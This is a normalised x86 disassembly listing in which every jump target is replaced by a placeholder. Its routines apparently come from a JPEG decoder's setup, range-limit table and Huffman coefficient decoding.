mov eax [ ebx + 0x14 ]
cmp eax 0xcf
je r-xdata
test esi esi
jg r-xdata
cmp eax 0xcc
je r-xdata
mov eax [ ebx + 0x1b4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi 0x1
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x98 ] esi
mov eax ebx
call sub_48d8bc
pop esi
pop ebx
retn
cmp esi [ ebx + 0x90 ]
jle r-xdata
mov esi [ ebx + 0x90 ]
sub_48db18
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp eax 0xcd
je r-xdata
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp eax 0xce
jne r-xdata
cmp [ ebx + 0x14 ] 0xd0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1a4 ]
call [ edx + 0x4 ]
mov [ ebx + 0x14 ] 0xd0
jmp r-xdata
mov edx [ ebx + 0x90 ]
cmp edx [ ebx + 0x98 ]
jg r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov [ ebx + 0x14 ] 0xcf
mov eax 0x1
pop ebx
retn
mov ecx [ ebx + 0x1b4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1b4 ]
call [ edx ]
test eax eax
jne r-xdata
xor eax eax
pop ebx
retn
sub_48dba0
push ebx
cmp [ eax + 0x4c ] 0x0
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ eax + 0x12c ] 0x0
je r-xdata
cmp [ eax + 0x28 ] 0x3
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ eax + 0x24 ] 0x3
jne r-xdata
cmp [ eax + 0x2c ] 0x2
jne r-xdata
cmp [ eax + 0x78 ] 0x3
je r-xdata
mov edx [ eax + 0xd8 ]
cmp [ edx + 0x8 ] 0x2
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ edx + 0x5c ] 0x1
jne r-xdata
cmp [ edx + 0xb0 ] 0x1
jne r-xdata
cmp [ edx + 0xc ] 0x2
jg r-xdata
cmp [ edx + 0x60 ] 0x1
jne r-xdata
cmp [ edx + 0xb4 ] 0x1
je r-xdata
mov edx [ eax + 0xd8 ]
mov ebx [ edx + 0x24 ]
mov ecx [ eax + 0x13c ]
cmp ebx ecx
jne r-xdata
xor eax eax
pop ebx
retn
cmp ecx [ edx + 0x78 ]
jne r-xdata
cmp ecx [ edx + 0xcc ]
je r-xdata
mov eax 0x1
pop ebx
retn
sub_48dc30
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x14 ] 0xca
je r-xdata
mov ecx [ ebx + 0x30 ]
shl ecx 0x3
cmp ecx [ ebx + 0x34 ]
ja r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx [ ebx + 0x30 ]
shl ecx 0x2
cmp ecx [ ebx + 0x34 ]
ja r-xdata
mov edx 0x8
mov eax [ ebx + 0x1c ]
call sub_497748
mov [ ebx + 0x70 ] eax
mov edx 0x8
mov eax [ ebx + 0x20 ]
call sub_497748
mov [ ebx + 0x74 ] eax
mov [ ebx + 0x13c ] 0x1
jmp r-xdata
mov ecx [ ebx + 0x30 ]
add ecx ecx
cmp ecx [ ebx + 0x34 ]
ja r-xdata
mov edx 0x4
mov eax [ ebx + 0x1c ]
call sub_497748
mov [ ebx + 0x70 ] eax
mov edx 0x4
mov eax [ ebx + 0x20 ]
call sub_497748
mov [ ebx + 0x74 ] eax
mov [ ebx + 0x13c ] 0x2
jmp r-xdata
xor edi edi
mov esi [ ebx + 0xd8 ]
jmp r-xdata
mov ecx [ ebx + 0x1c ]
mov [ ebx + 0x70 ] ecx
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x74 ] eax
mov [ ebx + 0x13c ] 0x8
mov edx 0x2
mov eax [ ebx + 0x1c ]
call sub_497748
mov [ ebx + 0x70 ] eax
mov edx 0x2
mov eax [ ebx + 0x20 ]
call sub_497748
mov [ ebx + 0x74 ] eax
mov [ ebx + 0x13c ] 0x4
jmp r-xdata
cmp edi [ ebx + 0x24 ]
jl r-xdata
mov eax [ ebx + 0x13c ]
jmp r-xdata
xor edi edi
mov esi [ ebx + 0xd8 ]
jmp r-xdata
cmp eax 0x8
jge r-xdata
cmp edi [ ebx + 0x24 ]
jl r-xdata
mov [ esi + 0x24 ] eax
inc edi
add esi 0x54
mov edx [ esi + 0x8 ]
imul edx eax
add edx edx
mov ecx [ ebx + 0x134 ]
imul ecx [ ebx + 0x13c ]
cmp edx ecx
jg r-xdata
mov eax [ esi + 0x8 ]
imul [ esi + 0x24 ]
imul [ ebx + 0x1c ]
mov edx [ ebx + 0x134 ]
shl edx 0x3
call sub_497748
mov [ esi + 0x28 ] eax
mov eax [ esi + 0xc ]
imul [ esi + 0x24 ]
imul [ ebx + 0x20 ]
mov edx [ ebx + 0x138 ]
shl edx 0x3
call sub_497748
mov [ esi + 0x2c ] eax
inc edi
add esi 0x54
mov ecx [ ebx + 0x2c ]
dec ecx
je r-xdata
mov edx [ esi + 0xc ]
imul edx eax
add edx edx
mov ecx [ ebx + 0x138 ]
imul ecx [ ebx + 0x13c ]
cmp edx ecx
jle r-xdata
mov [ ebx + 0x78 ] 0x1
jmp r-xdata
dec ecx
sub ecx 0x2
jb r-xdata
add eax eax
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov [ ebx + 0x78 ] 0x3
jmp r-xdata
sub ecx 0x2
jb r-xdata
mov edx [ ebx + 0x78 ]
mov edx 0x1
jmp r-xdata
mov [ ebx + 0x78 ] 0x4
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x80 ] 0x1
mov ecx [ ebx + 0x138 ]
mov [ ebx + 0x80 ] ecx
jmp r-xdata
mov [ ebx + 0x7c ] edx
mov eax ebx
call sub_48dba0
test eax eax
je r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebx + 0x78 ] eax
pop edi
pop esi
pop ebx
retn
sub_48de1c
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x580
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov esi eax
add esi 0x100
mov [ ebx + 0x144 ] esi
push 0x100
push 0x0
lea eax [ esi - 0x100 ]
push eax
call sub_48ab3c
add esp 0xc
xor eax eax
mov edx esi
mov [ edx ] al
inc eax
inc edx
cmp eax 0xff
jle r-xdata
add esi 0x80
mov eax 0x80
lea edx [ esi + 0x80 ]
mov [ edx ] 0xff
inc eax
inc edx
cmp eax 0x200
jl r-xdata
push 0x180
push 0x0
lea ecx [ esi + 0x200 ]
push ecx
call sub_48ab3c
add esp 0xc
push 0x80
mov eax [ ebx + 0x144 ]
push eax
add esi 0x380
push esi
call sub_48ab50
add esp 0xc
pop esi
pop ebx
retn
sub_48deb8
push ebx
mov ebx eax
push esi
mov eax ebx
mov esi [ ebx + 0x1a4 ]
call sub_48dc30
mov eax ebx
call sub_48de1c
mov eax [ ebx + 0x70 ]
imul [ ebx + 0x78 ]
mov edx eax
cmp eax edx
je r-xdata
xor ecx ecx
mov eax ebx
mov [ esi + 0xc ] ecx
call sub_48dba0
mov [ esi + 0x10 ] eax
xor edx edx
mov [ esi + 0x14 ] edx
xor ecx ecx
mov [ esi + 0x18 ] ecx
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x46
mov edx [ eax ]
call [ edx ]
xor eax eax
mov [ ebx + 0x64 ] eax
xor edx edx
mov [ ebx + 0x68 ] edx
xor ecx ecx
mov [ ebx + 0x6c ] ecx
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax ebx
call sub_494320
cmp [ ebx + 0xe0 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0x78 ] 0x3
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x2f
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0xdc ] 0x0
je r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x1
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
call sub_49055c
mov eax ebx
call sub_494880
mov eax ebx
call sub_490100
jmp r-xdata
cmp [ ebx + 0x88 ] 0x0
je r-xdata
mov [ ebx + 0x64 ] 0x1
xor ecx ecx
mov [ ebx + 0x68 ] ecx
xor eax eax
mov [ ebx + 0x6c ] eax
xor edx edx
mov [ ebx + 0x88 ] edx
jmp r-xdata
mov eax ebx
call sub_48fb54
mov eax ebx
call sub_48ef94
jmp r-xdata
mov edx [ ebx + 0x1b4 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebx + 0x6c ]
mov eax ebx
call sub_494038
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov [ ebx + 0x68 ] 0x1
jmp r-xdata
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax 0x1
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov [ ebx + 0x64 ] 0x1
mov [ ebx + 0x6c ] 0x1
jmp r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax ebx
call sub_4912dc
mov edx [ ebx + 0x1cc ]
mov [ esi + 0x14 ] edx
mov eax ebx
mov edx [ eax + 0x4 ]
call [ edx + 0x18 ]
mov eax ebx
mov edx [ eax + 0x1b4 ]
call [ edx + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_492c68
xor eax eax
jmp r-xdata
mov eax ebx
call sub_492550
mov edx [ ebx + 0x1cc ]
mov [ esi + 0x18 ] edx
cmp [ ebx + 0x68 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_493cc4
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x1b4 ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0xdc ] 0x0
je r-xdata
mov edx [ ebx + 0x24 ]
mov edx [ ebx + 0x24 ]
lea edx [ edx + edx * 2 ]
add edx 0x2
jmp r-xdata
mov eax 0x2
mov eax 0x3
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov ecx [ ebx + 0x140 ]
imul ecx edx
mov [ eax + 0x8 ] ecx
xor edx edx
mov [ eax + 0xc ] edx
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov edx [ ebx + 0x8 ]
mov [ edx + 0x10 ] eax
inc [ esi + 0xc ]
sub_48e0cc
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x1a4 ]
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
je r-xdata
xor eax eax
xor edx edx
mov [ esi + 0x8 ] eax
mov eax ebx
mov ecx [ eax + 0x1cc ]
call [ ecx ]
mov edx 0x2
mov eax ebx
mov ecx [ eax + 0x1b0 ]
call [ ecx ]
mov edx 0x2
mov eax ebx
mov ecx [ eax + 0x1a8 ]
call [ ecx ]
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x1c0 ]
call [ edx ]
mov eax ebx
mov edx [ eax + 0x1ac ]
call [ edx + 0x8 ]
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
cmp [ ebx + 0x88 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1c4 ]
call [ edx ]
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1c8 ]
call [ edx ]
cmp [ ebx + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov ecx 0x1
mov ecx 0x2
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov edx [ esi + 0x8 ]
mov eax ebx
mov ecx [ eax + 0x1cc ]
call [ ecx ]
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x2e
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x14 ]
mov [ ebx + 0x1cc ] eax
jmp r-xdata
mov edx [ esi + 0x18 ]
mov [ ebx + 0x1cc ] edx
mov [ esi + 0x8 ] 0x1
jmp r-xdata
mov edx [ ebx + 0x1b4 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
add ecx [ esi + 0xc ]
mov eax [ ebx + 0x8 ]
mov [ eax + 0x10 ] ecx
cmp [ ebx + 0x40 ] 0x0
je r-xdata
xor edx edx
mov edx 0x3
jmp r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov ecx [ eax + 0x1b0 ]
call [ ecx ]
xor edx edx
mov eax ebx
mov ecx [ eax + 0x1a8 ]
call [ ecx ]
mov eax 0x1
mov eax 0x2
jmp r-xdata
mov edx [ ebx + 0x8 ]
add [ edx + 0x10 ] eax
sub_48e23c
push ebx
mov ebx eax
push esi
cmp [ ebx + 0x14 ] 0xcf
mov esi [ ebx + 0x1a4 ]
je r-xdata
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x2e
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
cmp [ ebx + 0x68 ] 0x0
je r-xdata
cmp [ ebx + 0x88 ] 0x0
je r-xdata
mov eax ebx
mov ecx [ esi + 0x18 ]
mov [ ebx + 0x1cc ] ecx
mov edx [ eax + 0x1cc ]
call [ edx + 0xc ]
xor ecx ecx
mov [ esi + 0x8 ] ecx
pop esi
pop ebx
retn
sub_48e2a8
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x1c
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x1a4 ] eax
mov [ eax ] sub_48e0cc
mov [ eax + 0x4 ] sub_48e220
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ebx
call sub_48deb8
pop esi
pop ebx
retn
sub_48e2e0
push ebx
push esi
mov ebx eax
push edi
push ebp
add esp 0xffffffec
cmp [ ebx + 0x190 ] 0x0
sete al
and eax 0x1
mov ebp [ ebx + 0x1bc ]
mov [ esp ] eax
xor eax eax
cmp [ esp ] 0x0
je r-xdata
mov edx [ ebx + 0x194 ]
cmp edx [ ebx + 0x190 ]
jl r-xdata
cmp [ ebx + 0x194 ] 0x0
je r-xdata
mov eax 0x1
cmp edx 0x40
jl r-xdata
mov edx [ ebx + 0x198 ]
test edx edx
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
cmp [ ebx + 0x148 ] 0x1
je r-xdata
cmp [ ebx + 0x19c ] 0xd
jle r-xdata
dec edx
cmp edx [ ebx + 0x19c ]
je r-xdata
test eax eax
je r-xdata
mov eax 0x1
mov eax 0x1
xor eax eax
mov [ esp + 0x4 ] eax
lea ecx [ ebx + 0x14c ]
mov [ esp + 0xc ] ecx
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x10
mov edx [ ebx + 0x190 ]
mov [ eax + 0x18 ] edx
mov ecx [ ebx + 0x194 ]
mov [ eax + 0x1c ] ecx
mov edx [ ebx + 0x198 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebx + 0x19c ]
mov [ eax + 0x24 ] ecx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov edx [ esp + 0x4 ]
cmp edx [ ebx + 0x148 ]
jl r-xdata
mov eax [ esp + 0xc ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ esp + 0x8 ] ecx
mov esi [ esp + 0x8 ]
shl esi 0x8
add esi [ ebx + 0xa0 ]
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x198 ] 0x0
jne r-xdata
mov edi [ ebx + 0x190 ]
lea eax [ esi + edi * 4 ]
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
jge r-xdata
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
cmp edi [ ebx + 0x194 ]
jle r-xdata
mov eax [ ebx ]
xor ecx ecx
mov [ eax + 0x14 ] 0x73
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] ecx
mov eax ebx
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebp + 0x4 ] sub_48eb68
mov [ ebp + 0x4 ] sub_48ea70
jmp r-xdata
mov [ ebp + 0x4 ] sub_48e7e4
jmp r-xdata
mov [ ebp + 0x4 ] sub_48e5a8
jmp r-xdata
cmp [ esi ] 0x0
jge r-xdata
inc [ esp + 0x4 ]
add [ esp + 0xc ] 0x4
mov edx [ esp + 0x4 ]
cmp edx [ ebx + 0x148 ]
jl r-xdata
xor ecx ecx
lea eax [ ebp + 0x18 ]
mov [ esp + 0x4 ] ecx
mov [ esp + 0x10 ] eax
lea edi [ ebx + 0x14c ]
jmp r-xdata
mov eax [ esi ]
xor eax eax
jmp r-xdata
mov eax [ edi ]
cmp [ esp ] 0x0
je r-xdata
xor ecx ecx
xor eax eax
mov [ ebp + 0x10 ] ecx
mov [ ebp + 0xc ] eax
xor edx edx
xor ecx ecx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0x14 ] ecx
mov eax [ ebx + 0x114 ]
mov [ ebp + 0x28 ] eax
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
mov [ esi ] eax
inc edi
add esi 0x4
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x73
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] edi
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp eax [ ebx + 0x198 ]
je r-xdata
mov esi [ eax + 0x18 ]
xor edx edx
mov ecx esi
lea eax [ ebp + esi * 4 + 0x2c ]
push eax
mov eax ebx
call sub_48f140
mov edx [ ebp + esi * 4 + 0x2c ]
mov [ ebp + 0x3c ] edx
cmp [ ebx + 0x198 ] 0x0
jne r-xdata
mov ecx [ esp + 0x10 ]
xor eax eax
mov [ ecx ] eax
inc [ esp + 0x4 ]
add [ esp + 0x10 ] 0x4
add edi 0x4
mov esi [ eax + 0x14 ]
mov edx 0x1
mov ecx esi
lea eax [ ebp + esi * 4 + 0x2c ]
push eax
mov eax ebx
call sub_48f140
jmp r-xdata
sub_48e534
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x1bc ]
mov eax [ esi + 0x10 ]
test eax eax
jns r-xdata
sar eax 0x3
mov edx [ ebx + 0x1b8 ]
add [ edx + 0x18 ] eax
xor ecx ecx
mov [ esi + 0x10 ] ecx
mov eax ebx
mov edx [ eax + 0x1b8 ]
call [ edx + 0x8 ]
test eax eax
jne r-xdata
add eax 0x7
xor edx edx
lea eax [ esi + 0x18 ]
jmp r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp edx [ ebx + 0x148 ]
jl r-xdata
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
xor edx edx
mov [ esi + 0x14 ] edx
mov eax [ ebx + 0x114 ]
mov [ esi + 0x28 ] eax
cmp [ ebx + 0x1a0 ] 0x0
jne r-xdata
mov eax 0x1
pop esi
pop ebx
retn
xor edx edx
mov [ esi + 0x8 ] edx
sub_48e5a8
push ebx
push esi
push edi
push ebp
mov ebp eax
add esp 0xffffffb4
mov ebx edx
mov eax [ ebp + 0x1bc ]
mov [ esp ] eax
mov edx [ ebp + 0x19c ]
mov [ esp + 0x4 ] edx
cmp [ ebp + 0x114 ] 0x0
je r-xdata
mov edx [ esp ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov eax [ esp ]
dec [ eax + 0x28 ]
mov eax 0x1
mov [ esp + 0x34 ] ebp
mov eax [ ebp + 0x18 ]
mov edx [ eax ]
mov [ esp + 0x24 ] edx
lea edx [ ebp + 0x168 ]
mov ecx [ eax + 0x4 ]
mov [ esp + 0x28 ] ecx
mov ecx 0x5
mov eax [ esp ]
mov edi [ eax + 0xc ]
mov eax [ esp ]
mov esi [ eax + 0x10 ]
mov eax [ esp ]
push esi
push edi
lea edi [ esp + 0x40 ]
lea esi [ eax + 0x14 ]
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov ecx ebx
mov [ esp + 0x8 ] eax
mov [ esp + 0x20 ] edx
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov eax ebp
call sub_48e534
test eax eax
jne r-xdata
mov edx [ ebp + 0x164 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp + 0x1c ]
mov edx [ eax ]
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x20 ]
mov eax [ ecx ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
mov eax [ ebp + edx * 4 + 0x14c ]
mov edx [ eax + 0x14 ]
mov ecx [ esp ]
mov eax [ ecx + edx * 4 + 0x2c ]
mov [ esp + 0x14 ] eax
cmp esi 0x8
jge r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ esp + 0x24 ]
mov [ eax ] edx
mov ecx [ esp + 0x28 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov [ eax + 0xc ] edi
mov edx [ esp ]
mov [ edx + 0x10 ] esi
lea esi [ esp + 0x38 ]
mov ecx [ esp ]
lea edi [ ecx + 0x14 ]
mov ecx 0x5
[ edi ] [ esi ]
add esp 0x4c
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esi - 0x8 ]
mov eax edi
sar eax cl
and eax 0xff
mov edx [ esp + 0x14 ]
mov edx [ edx + eax * 4 + 0x90 ]
mov [ esp + 0x18 ] edx
test edx edx
je r-xdata
push 0x0
lea eax [ esp + 0x28 ]
mov ecx esi
mov edx edi
call sub_48f43c
test eax eax
jne r-xdata
mov [ esp + 0x18 ] 0x9
sub esi [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
xor ebx ebx
mov bl [ ecx + eax + 0x490 ]
jmp r-xdata
mov edi [ esp + 0x2c ]
mov esi [ esp + 0x30 ]
cmp esi 0x8
jge r-xdata
xor eax eax
jmp r-xdata
mov edi [ esp + 0x2c ]
mov esi [ esp + 0x30 ]
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
mov [ esp + 0x18 ] 0x1
jmp r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
add ebx [ esp + eax * 4 + 0x3c ]
mov [ esp + ecx * 4 + 0x3c ] ebx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x10 ]
shl bx cl
mov [ eax ] bx
inc [ esp + 0x8 ]
add [ esp + 0x20 ] 0x4
add [ esp + 0x1c ] 0x4
cmp ebx esi
jle r-xdata
mov eax [ esp + 0x14 ]
mov ecx esi
push eax
mov edx [ esp + 0x1c ]
push edx
mov edx edi
lea eax [ esp + 0x2c ]
call sub_48f588
mov ebx eax
test eax eax
jge r-xdata
sub esi ebx
mov ecx esi
mov eax edi
sar eax cl
mov ecx ebx
mov edx 0x1
shl edx cl
dec edx
and eax edx
cmp eax [ ebx * 4 + rw-data ]
jge r-xdata
push ebx
lea eax [ esp + 0x28 ]
mov ecx esi
mov edx edi
call sub_48f43c
test eax eax
jne r-xdata
mov edx eax
mov edx [ ebx * 4 + rw-data ]
add edx eax
jmp r-xdata
mov edi [ esp + 0x2c ]
mov esi [ esp + 0x30 ]
xor eax eax
jmp r-xdata
mov ebx edx
sub_48e7e4
push ebx
push esi
push edi
push ebp
add esp 0xffffffcc
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1bc ]
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x194 ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x19c ]
mov [ esp + 0xc ] ecx
mov eax [ esp ]
cmp [ eax + 0x114 ] 0x0
je r-xdata
mov edx [ esp + 0x4 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov edx [ esp + 0x4 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
mov edx [ esp + 0x4 ]
mov eax 0x1
dec [ edx + 0x28 ]
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x14 ]
mov [ esp + 0x14 ] eax
cmp [ esp + 0x14 ] 0x0
jbe r-xdata
mov eax [ esp ]
call sub_48e534
test eax eax
jne r-xdata
mov edx [ esp ]
mov [ esp + 0x30 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x18 ]
mov edx [ eax ]
mov [ esp + 0x20 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x24 ] ecx
mov eax [ esp + 0x4 ]
mov ebp [ eax + 0xc ]
mov eax [ esp + 0x4 ]
mov ebx [ eax + 0x10 ]
mov eax [ esi ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x3c ]
mov [ esp + 0x1c ] ecx
mov eax [ esp ]
mov edx [ eax + 0x190 ]
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x10 ]
cmp ecx [ esp + 0x8 ]
jg r-xdata
dec [ esp + 0x14 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x18 ]
mov edx [ esp + 0x20 ]
mov [ eax ] edx
mov ecx [ esp + 0x24 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp + 0x4 ]
mov [ eax + 0xc ] ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x10 ] ebx
cmp ebx 0x8
jge r-xdata
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x14 ]
mov [ ecx + 0x14 ] eax
add esp 0x34
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx - 0x8 ]
mov eax ebp
sar eax cl
and eax 0xff
mov edx [ esp + 0x1c ]
mov esi [ edx + eax * 4 + 0x90 ]
test esi esi
je r-xdata
push 0x0
lea eax [ esp + 0x24 ]
mov ecx ebx
mov edx ebp
call sub_48f43c
test eax eax
jne r-xdata
mov esi 0x9
sub ebx esi
mov edx [ esp + 0x1c ]
movzx edi [ edx + eax + 0x490 ]
jmp r-xdata
mov ebp [ esp + 0x28 ]
mov ebx [ esp + 0x2c ]
cmp ebx 0x8
jge r-xdata
xor eax eax
jmp r-xdata
mov ebp [ esp + 0x28 ]
mov ebx [ esp + 0x2c ]
xor eax eax
jmp r-xdata
mov esi edi
sar esi 0x4
and edi 0xf
test edi edi
je r-xdata
mov esi 0x1
jmp r-xdata
cmp esi 0xf
jne r-xdata
add [ esp + 0x10 ] esi
cmp edi ebx
jle r-xdata
mov eax [ esp + 0x1c ]
push eax
push esi
lea eax [ esp + 0x28 ]
mov ecx ebx
mov edx ebp
call sub_48f588
mov edi eax
test eax eax
jge r-xdata
mov ecx esi
mov edi 0x1
shl edi cl
mov [ esp + 0x14 ] edi
test esi esi
je r-xdata
add [ esp + 0x10 ] 0xf
jmp r-xdata
sub ebx edi
mov ecx ebx
mov esi ebp
sar esi cl
mov ecx edi
mov eax 0x1
shl eax cl
dec eax
and esi eax
cmp esi [ edi * 4 + rw-data ]
jge r-xdata
push edi
lea eax [ esp + 0x24 ]
mov ecx ebx
mov edx ebp
call sub_48f43c
test eax eax
jne r-xdata
dec [ esp + 0x14 ]
jmp r-xdata
cmp esi ebx
jle r-xdata
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp edx [ esp + 0x8 ]
jle r-xdata
mov edx esi
mov edx [ edi * 4 + rw-data ]
add edx esi
jmp r-xdata
mov ebp [ esp + 0x28 ]
mov ebx [ esp + 0x2c ]
xor eax eax
jmp r-xdata
sub ebx esi
mov eax ebp
mov ecx ebx
dec edi
sar eax cl
and eax edi
mov esi eax
add [ esp + 0x14 ] esi
push esi
lea eax [ esp + 0x24 ]
mov ecx ebx
mov edx ebp
call sub_48f43c
test eax eax
jne r-xdata
mov edi edx
mov ecx [ esp + 0xc ]
shl di cl
mov eax [ esp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ esp + 0x18 ]
mov [ edx + eax * 2 ] di
jmp r-xdata
mov ebp [ esp + 0x28 ]
mov ebx [ esp + 0x2c ]
xor eax eax
jmp r-xdata
sub_48ea70
push ebx
push esi
mov ebx eax
push edi
add esp 0xffffffdc
mov esi edx
mov eax [ ebx + 0x1bc ]
mov edx 0x1
mov [ esp ] eax
mov ecx [ ebx + 0x19c ]
shl edx cl
mov [ esp + 0x4 ] edx
cmp [ ebx + 0x114 ] 0x0
je r-xdata
mov [ esp + 0x20 ] ebx
